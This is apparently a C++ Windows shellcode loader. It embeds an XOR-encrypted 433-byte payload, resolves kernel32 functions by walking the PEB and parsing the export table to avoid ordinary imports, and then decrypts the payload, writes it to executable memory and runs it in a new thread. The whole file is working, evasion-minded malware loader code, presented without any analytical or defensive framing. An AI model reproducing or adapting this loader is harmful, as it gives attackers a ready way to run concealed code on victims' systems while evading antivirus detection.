#include <iostream>
#pragma once
#include <Windows.h>

UCHAR payload[] = "\x10\xb2\x88\x70\x79\xe7\xbc\xc1\x2c\xd5\x24\x02\x58\x31\x64\x10\xbc\x69\x0a\x31\x64\x58\xd9\xfa\x58\x31\x64\x14\xba\x9c\x10\xbc\x69\x05\x31\x64\x58\xce\xb4\x10\xbc\x71\x07\x31\x64\x58\x79\xe9\x55\x7c\x64\x58\x31\x8c\x27\x31\x64\x58\x7c\x57\x91\x7d\xe9\x5d\x50\x64\x58\x31\x2c\xd5\x24\x2a\x58\x31\x64\x10\x02\xad\xa7\xe1\x2c\xd5\x24\x32\x58\x31\x64\x10\xbc\x69\x52\x31\x64\x58\xd9\x32\x58\x31\x64\x10\x02\xad\xa7\xe1\x2f\x1d\x63\x2a\x1d\x7d\x57\x6a\x1f\x20\x14\x7d\x64\x14\x5e\x05\x3c\x7d\x0d\x3a\x43\x05\x2a\x48\x25\x58\x64\x37\x1d\x63\x57\x6a\x1f\x20\x14\x7d\x64\x15\x54\x17\x2b\x50\x03\x3d\x73\x0b\x20\x70\x64\x10\x54\x08\x34\x5e\x44\x2f\x5e\x16\x34\x55\x64\x15\x54\x17\x2b\x50\x03\x3d\x31\x21\x20\x58\x10\x08\x43\x0b\x3b\x54\x17\x2b\x31\x2c\xdb\xdd\x4c\x3d\x7d\xef\x5c\x14\x04\x58\x31\x64\x15\xba\x24\x40\x7c\xe9\x38\x21\x29\xd3\x35\x40\xa4\x78\xef\x20\x51\x2c\xd3\xc0\xc8\xdc\xf1\x10\x7e\xbb\x43\xd8\xcd\x05\x24\x32\xe4\xb4\x11\x5e\xb8\x44\x6c\x10\xce\xa3\x10\xce\xa3\xb3\xd4\x29\xd3\x31\x29\x63\xf5\x11\x8e\x79\x57\x98\xd8\xc3\x58\x31\x64\x11\xba\x3c\x68\x75\xef\x13\x0d\x28\x5b\xfa\x2d\xd9\xf0\xec\x58\x31\x64\x1d\xba\x4d\x15\xb4\x89\x2d\x39\x2c\x6b\xf1\x8d\xdd\x31\x64\x58\x7f\xe9\x5c\x1a\x21\xd3\x40\x60\x15\x32\x91\x19\xba\x2c\x40\x74\xef\x08\x11\x28\x5b\xe2\x9b\x91\x7c\xe9\x54\xbb\x25\xd3\x08\x2c\x5b\xca\x2c\xd3\xc3\xc2\x2d\x39\xee\x5e\xb5\xa4\x2c\x38\x8f\xad\xd3\x82\x10\x02\xa4\xb3\x7f\x21\xd3\x79\x40\x14\x32\xaf\x3e\x70\xef\x54\x78\x21\xd3\x79\x78\x14\x32\xaf\x19\xba\x60\xd1\x78\x5f\x9d\x4d\x4b\x11\x0a\xa2\x2b\x1b\x2c\xd5\x05\x7c\x10\xbc\x18\x7c\x01\x28\xd3\xd6\xc0\xd8\x0f\x4a\x2d\xcb\xc0\x9f\x36\x20\x14\x7d\x64\x11\xba\xa8\x19\xce\xb3\x11\xba\xa8\x10\xba\xb2\xb1\x25\x9b\xa7\xce\x2c\x5b\xf2\x2c\xdb\xf5\x4c\x9b";
SIZE_T sPayloadSize = 433;

typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* VirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef HANDLE(WINAPI* GetCurrentProcess_t)();

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    ULONG Initialized;
    PVOID SsHandle;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InInitOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InInitializationOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    PVOID EntryPoint;
    PVOID Reserved3;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    PVOID Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, * PPEB;

PVOID GetModuleBaseAddress(const wchar_t* targetDllName) {
    // Get the PEB address
    PPEB pPeb = (PPEB)__readgsqword(0x60);

    // Access the PEB_LDR_DATA structure
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    // Traverse the list of loaded DLLs
    while (pDte != (PLDR_DATA_TABLE_ENTRY)&pLdr->InMemoryOrderModuleList) {
        // Compare the DLL name (case-insensitive)
        if (_wcsicmp(pDte->BaseDllName.Buffer, targetDllName) == 0) {
            return pDte->DllBase; // Return the base address if found
        }

        // Move to the next DLL
        pDte = *(PLDR_DATA_TABLE_ENTRY*)pDte;
    }

    return NULL; // DLL not found
}

struct ChargeDLL {
    HMODULE hKernel;

    VirtualAlloc_t pVirtualAlloc;
    WriteProcessMemory_t pWriteProcessMemory;
    VirtualProtect_t pVirtualProtect;
    CreateThread_t pCreateThread;
    VirtualFree_t pVirtualFree;
    GetCurrentProcess_t pGetCurrentProcess;
};

PVOID GetProcAddressFromExportTable(PBYTE pPeBuffer, const char* functionName) {
    // Cast the DOS header
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pPeBuffer;

    // Validate the DOS header
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Invalid DOS Header signature.\n");
        return NULL;
    }

    // Get the NT headers
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pPeBuffer + pImgDosHdr->e_lfanew);

    // Validate the NT headers
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        printf("Invalid NT Headers signature.\n");
        return NULL;
    }

    // Get the Optional Headers
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;

    // Get the Export Data Directory
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pPeBuffer +
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Get arrays for function names, addresses, and ordinals
    PDWORD FunctionNameArray = (PDWORD)(pPeBuffer + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pPeBuffer + pImgExportDir->AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pPeBuffer + pImgExportDir->AddressOfNameOrdinals);

    // Search for the function
    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {
        // Get the function name
        CHAR* pFunctionName = (CHAR*)(pPeBuffer + FunctionNameArray[i]);

        // Compare with the target function name
        if (strcmp(pFunctionName, functionName) == 0) {
            // Get the ordinal for this function
            WORD wFunctionOrdinal = FunctionOrdinalArray[i];

            // Get the function address
            DWORD FunctionRVA = FunctionAddressArray[wFunctionOrdinal];
            return (PVOID)(pPeBuffer + FunctionRVA);
        }
    }

    // Function not found
    printf("Function %s not found in export table.\n", functionName);
    return NULL;
}

int chargerLib(ChargeDLL* chargeDLL) {

    // Charger la DLL
    //HMODULE hUser32 = LoadLibraryA("kernel32.dll");
    //if (hUser32 == NULL) return 0;

    chargeDLL->hKernel = (HMODULE)GetModuleBaseAddress(L"C:\\Windows\\System32\\KERNEL32.dll");
    if (chargeDLL->hKernel == NULL) return 0;

    // Use the new GetProcAddressFromExportTable function
    chargeDLL->pVirtualAlloc = (VirtualAlloc_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "VirtualAlloc");
    if (chargeDLL->pVirtualAlloc == NULL) return 0;

    chargeDLL->pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "WriteProcessMemory");
    if (chargeDLL->pWriteProcessMemory == NULL) return 0;

    chargeDLL->pVirtualProtect = (VirtualProtect_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "VirtualProtect");
    if (chargeDLL->pVirtualProtect == NULL) return 0;

    chargeDLL->pCreateThread = (CreateThread_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "CreateThread");
    if (chargeDLL->pCreateThread == NULL) return 0;

    chargeDLL->pVirtualFree = (VirtualFree_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "VirtualFree");
    if (chargeDLL->pVirtualFree == NULL) return 0;

    chargeDLL->pGetCurrentProcess = (GetCurrentProcess_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "GetCurrentProcess");
    if (chargeDLL->pGetCurrentProcess == NULL) return 0;

    return 1; // Success
}

void FreeLib(ChargeDLL* chargeDLL) {

    // Libérer la DLL
    FreeLibrary(chargeDLL->hKernel);

}

int main()
{
    ChargeDLL chargeDLL = { 0 };
    if (chargerLib(&chargeDLL) == 0) return 0;
    if (chargeDLL.pVirtualAlloc == NULL) return 0;
    if (chargeDLL.pWriteProcessMemory == NULL) return 0;
    if (chargeDLL.pVirtualProtect == NULL) return 0;
    if (chargeDLL.pCreateThread == NULL) return 0;
    if (chargeDLL.pVirtualFree == NULL) return 0;

    void* addr = chargeDLL.pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (addr == 0) {
        return 1;
    }

    size_t bytesWritten = 0;
    const size_t SHELLCODE_SIZE = sizeof(payload);

    const unsigned char KEY[] = { 0x58, 0x31, 0x64 };
    const size_t KEY_SIZE = sizeof(KEY);


    UCHAR decryptedPayload[SHELLCODE_SIZE] = {};

    for (size_t i = 0; i < SHELLCODE_SIZE - 1; ++i) {
        decryptedPayload[i] = payload[i] ^ KEY[i % KEY_SIZE];
        //printf("/%x", decryptedPayload[i]);
    };

    chargeDLL.pWriteProcessMemory(chargeDLL.pGetCurrentProcess(), addr, decryptedPayload, sPayloadSize, &bytesWritten);

    DWORD dwPro;
    chargeDLL.pVirtualProtect(addr, sPayloadSize, PAGE_EXECUTE_READ, &dwPro);

    chargeDLL.pCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);

    Sleep(10000);
    //void (*ret)() = (void(*)())addr;
    //ret();

    chargeDLL.pVirtualFree(addr, 0, MEM_RELEASE);

    // Libérer les DLL
    FreeLib(&chargeDLL);

}
